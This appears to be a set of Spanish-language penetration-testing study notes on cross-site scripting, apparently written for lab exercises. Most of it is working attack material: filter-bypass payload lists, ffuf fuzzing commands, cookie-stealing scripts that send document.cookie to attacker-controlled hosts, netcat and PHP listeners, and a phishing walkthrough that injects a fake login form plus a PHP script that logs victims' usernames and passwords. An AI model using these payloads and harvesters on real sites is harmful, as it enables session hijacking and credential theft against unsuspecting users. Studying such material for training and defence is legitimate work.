Interesante: [payloadallthethings-xss](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#xss-in-htmlapplications)
Algunos de los ejemplos más clásicos de estos ataques son conseguir que el usuario objetivo envíe sin saberlo su cookie de sesión al servidor web del atacante. Otro ejemplo básico es que el usuario objetivo realice llamadas a la API que conduzcan a una acción maliciosa como crear un superusuario o cambiar alguna contraseña. Poder ejecutar js en el navegador, combinado con alguna vulnerabilidad binaria en el navegador puede conducir a ejecutar RCE en la máquina objetivo. 
## Tipos de XSS

| **Tipo de XSS**                      | **Descripción**                                                                                                                                                                      |
| ------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`Stored XSS (Persistent)`**        | El código malicioso **se almacena en la base de datos o archivos** del servidor y se ejecuta en los navegadores de múltiples usuarios (Ejemplo: en comentarios, perfiles, foros).    |
| **`Reflected XSS (Non-Persistent)`** | El código malicioso **se envía en una URL o formulario**, se **refleja en la respuesta del servidor**, y se ejecuta en el navegador de la víctima cuando accede al enlace malicioso. |
| **`DOM-Based XSS`**                  | Ocurre completamente en el **navegador** sin intervención del servidor, cuando JavaScript manipula el **DOM** de forma insegura y ejecuta código malicioso.                          |
## Algunas  alternativas para inyección de código
### Alternativas a `alert()`

En algunos navegadores modernos se puede bloquear `alert()` en algunas ubicaciones específicas. Aún así existen alternativas para comprobar la inyección de código
- **Alert básico**
	```html
	<script>alert("¿XSS detectado");</script>
	```
-  **Mostrar en consola**
	```html
	<script>console.log("XSS detectado!");</script>
	```
-  **Mostrar cuadro de confirmación**
	```html
	<script>confirm("¿XSS detectado?");</script>
	```
- **Mostrar caja de entrada emergente**
	```html
	<script>prompt("XSS encontrado!");</script>
	```
- **Modificar la página con un mensaje visible**
	```html
	<script>document.write("XSS funciona!");</script>
	```
- **Inyectar contenido en el DOM**
	```html
	<script>document.body.innerHTML = "<h1>XSS aquí!</h1>";</script>
	```
- **Forzar un diálogo de impresión (difícil de bloquear)**
	```html
	<script>print();</script>
	```
- **Forzar que el HTML posterior sea texto plano (`<plaintext>`)**
	```html
	<plaintext>
	# Debería renderizar la página de forma
	````

### Alternativas a `<script>`

Si `<script>` está filtrado, podemos intentar ejecutar Javascript de otros modos

-  **Eventos en elementos HTML**
	```html
	<img src="x" onerror="alert('XSS!')">
	
	<div onmouseover="alert('XSS!')">Pasa el ratóǹ aquí</div>
	
	<button onclick="alert('XSS!')">Haz clic aquí</button>
	
	<body onload="alert('XSS!')">
	```
-  **Usar `setTimeout()` para ejecutar código sin `<script>`**
	```html
	<a href="javascript:setTimeout(()=>{alert('XSS')}, 1000)">Haz clic</a>
	```
-  **Usar `eval()` si está permitido**
	```html
	<a href="javascript:eval('alert(1)')">Ejecutar XSS</a>
	```
-  **Usar `new Function()` en lugar de `eval()`**
	```html
	<script>new Function("alert('XSS!')")();</script>
	```
-  **Usar `<svg>` con `onload`**
	```html
	<svg onload="alert('XSS!')"></svg>
	```
-  **Usar `<math>` con `onmouseover` (Para algunos navegadores)**
	```html
	<math href="javascript:alert('XSS!')" xlink:href="javascript:alert('XSS!')"></math>
	```

-  **Usar `<iframe>` con `srcdoc`**
	```html
	<iframe srcdoc="<script>alert('XSS!')</script>"></iframe>
	```
### Métodos Especiales para Bypass de Bloqueos
Si el sitio bloquea los métodos anteriores, podemos probar algunos enfoques como los que siguen:
-  **Ejecutar código después de un tiempo (`setTimeout` y `setInterval`)**
	```html
	<script>setTimeout(()=>{alert("XSS!")}, 2000);</script>
	<script>setInterval(()=>{alert("XSS!")}, 5000);</script>
	```
-  **Ejecutar código usando `location.href`**
	```html
	# redirige automáticamente a la página dada
	<script>window.location='http://10.10.14.108/com/?xss='+document.cookie;</script>
	```
-  **Exfiltrar datos usando `fetch()`**
	```html
	<script>fetch("http://attacker.com/log?xss="+document.cookie);</script>
	```

### Carácteres de escape y distintos payloads
#### Caracteres de escape
También hay una serie de carácteres de escape y similar en `/usr/share/seclists/Fuzzing/XSS/`
```txt
# para romper cadenas en html
'
"
'"
"'
'">
"'>
>
<
</
/>
</script>
</textarea>
</style>
</iframe>
</svg>
</a>
# para romper cadenas en js
\
\'
\"
\;
\`
\$
\{
\}
\(
\)

```

#### Distintos payloads
```html
# Comillas Simples y Dobles
'<script>alert("XSS!");</script>
"><script>alert("XSS!");</script>
'"'><script>alert("XSS!");</script>
"'><script>alert("XSS!");</script>
'><img src=x onerror=alert("XSS!")>
"><img src=x onerror=alert("XSS!")>
"><svg/onload=alert("XSS!")>
'><svg/onload=alert("XSS!")>

# Inyección en Atributos HTML
"><script>alert(1)</script>
" onmouseover="alert('XSS!')" 
' onerror="alert('XSS!')"
' onclick="alert('XSS!')"
" autofocus onfocus="alert('XSS!')"
'><input type="text" value="XSS" onfocus="alert('XSS!')" autofocus>

# Caracteres Especiales < y >
><script>alert("XSS!")</script>
<svg><script>alert("XSS!")</script></svg>
<iframe src="javascript:alert('XSS!')"></iframe>
<marquee onstart="alert('XSS!')">XSS</marquee>

# Codificación Hexadecimal &#x
&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;
&#x3C;img src=x onerror=alert(1)&#x3E;
&#x3C;svg/onload=alert(1)&#x3E;

# Codificación Decimal &#
&#60;script&#62;alert("XSS")&#60;/script&#62;
&#60;img src=x onerror=alert("XSS!")&#62;

# Inyección en URLs (javascript:)
javascript:alert("XSS!")
"><a href="javascript:alert('XSS!')">Click aquí</a>
"><iframe src=javascript:alert("XSS!")>
"><body onload=alert("XSS!")>
"><meta http-equiv="refresh" content="0;url=javascript:alert(1)">

# Inyección con data: URL
<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+" />
<script src="data:text/javascript,alert('XSS!')"></script>

# Inyección en JavaScript (eval(), setTimeout(), setInterval())
';alert("XSS");//
');alert("XSS");//
");alert("XSS");//"
'-alert("XSS")-'
`;alert("XSS");`
`;setTimeout("alert('XSS!')",1000);`

# Inyección en JSON
{"username": "<script>alert('XSS!')</script>"}
{"message": "';alert(1)//"}

# Inyección en CSS
body { background: url("javascript:alert('XSS!')"); }
body { background-image: url("data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+") }
```
- Todas estas inyecciones se podrían probar con herramientas como `ffuf` del siguiente modo:
	```bash
	# filtrando por tamaño: con -fs
	ffuf -w xss_payloads.txt:FUZZ -u "http://target.com/vuln?input=FUZZ" -fs 1234
	# filtrando por contenido en la respuesta: con -fs
	`ffuf -w xss_payloads.txt:FUZZ -u "http://target.com/vuln?input=FUZZ" -fr "Invalid input"`
	# Viendo si el payload aparece en la respuesta
	ffuf -w xss_payloads.txt:FUZZ -u "http://target.com/vuln?input=FUZZ" -mr "<script>"
	```
### Producto cartesiano de ficheros
Supongamos que tenemos un fichero con carácteres de escape `escapeXSS` y otro con payloads `payloadsXSS_tipoAlert` y queremos combinarlos para ganar combinaciones y aplicar fuzzing con `burpsuite` ó `ffuf`
```bash
while IFS= read -r p; do while IFS= read -r e; do echo "$e$p"; done < escapeXSS ; done < payloadsXSS_tipoAlert > combinados
```
Aunque si queremos utilizar `ffuf`, podemos obtener este mismo resultado con doble fuzzing, por ej: 
```bash
ffuf -w escapeXSS:ESC -w payloadsXSS_tipoAlert:PAY -u "http://target.com/?param=ESCPAY"
```
## Envíando cookies de sesión - session Hijacking
### Fetch
- Payload básico con GET
	```html
	<script>fetch("http://10.10.14.108/?cookie=" + encodeURIComponent(document.cookie));</script>

	```
- Payload básico con POST
	```html
	<script>fetch("http://YOUR_IP/", {method: "POST", body: document.cookie});</script>
	```
- Payload con encabezados personalizados (algunas aplicaciones bloquean `fetch()` sin encabezados válidos)
	```html
	<script>
	fetch("http://YOUR_IP/", {
	  method: "POST",
	  headers: {"Content-Type": "application/x-www-form-urlencoded"},
	  body: "cookies=" + encodeURIComponent(document.cookie)
	});
	</script>
	```
- Payload alternativo (si `fetch` está bloqueado)
	```html
	<script>new Image().src = "http://YOUR_IP/?cookies=" + encodeURIComponent(document.cookie);
	</script>
	```
- Con `document.location`
	```javascript
	document.location='http://OUR_IP/index.php?c='+document.cookie;
	```
Podemos recoger la información con alguno de estos comandos desde nuestra pwnbox: 
```bash
nc -nlvp 80
python -m http.server
php -S 0.0.0.0:80
```
En solicitudes tipo GET en las que se haya envíado una cookie como parámetro `c=VALUE_COOKIE`, podríamos crear un servidor python para que guarde en un archivo las cookies. Para ello, crearíamos un `index.php`  con el siguiente contenido: 

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

## Cargando un script remoto
Una forma común de cargar un script es con las etiquetas: 
```html
<script src="http://OUR_IP/script.js"></script>
```


### Ejemplo de phishing
#### Url: `$target/phising`
Tenemos una página web que nos "muestra" cualquier imagen que le pasemos por url. Si le pasamos el parámetro hola, en el navegador se crea una petición web como la que sigue: `http://$target/phishing/index.php?url=hola`. Probamos con distintas inserciones
- Inserción: `hola` -> Renderiza  `<img src="prueba">`
- Inserción: `hola" onerror="alert('XSS!')">` -> Renderiza `<img src='hola" onerror="alert('XSS!')">'>`. Se muestra en la pantalla `'>`, lo cual nos indica que el carácter `'` no está escapado correctamente. 
- Inserción: `'hola" onerror="alert('XSS!')">` -> Renderiza `<img src=''hola" onerror="alert('XSS!')">'>` y ya genera una inyección XSS
- Comprobamos que también genera inyección xss el siguiente payload: `'><script>alert("¿XSS detectado?");</script>`
- Creamos un payload más elaborado, de manera que en la página se crea un formulario al que se envía la información de nuestro lado, quedando así el payload: 
	```html
	'><script>document.write('<h3>Please login to continue</h3><form action=http://10.10.14.108><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();</script>
	```

#### Url: `http://$target/phishing/send.php`
En esta página nos aseguran que el campo que pasemos como enlace será clicado por un tercero, por lo que debemos construir un enlace a medida con la información anteriror. 
- Nos ponemos en escucha en el puerto 80
	```
	nc -nlvp 80
	```
- Copiamos la url del  payload generado  anteriormente y lo envíamos como parámetro, recibiendo las credenciales
Podríamos haber hecho algo un poco más elaborado, para recoger las credenciales y que el usuario no notase ninguna interacción rara. Para ello 
- Crearíamos un `index.php` con el siguiente contenido: 
	```php
	<?php
	if (isset($_GET['username']) && isset($_GET['password'])) {
	    $file = fopen("creds.txt", "a+");
	    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
	    header("Location: http://10.129.15.214/phishing/index.php");
	    fclose($file);
	    exit();
	}
	?>
	```
- Y crearíamos un server php escuchando en el puerto 80
	```bash
	php -S 0.0.0.0:80
	```
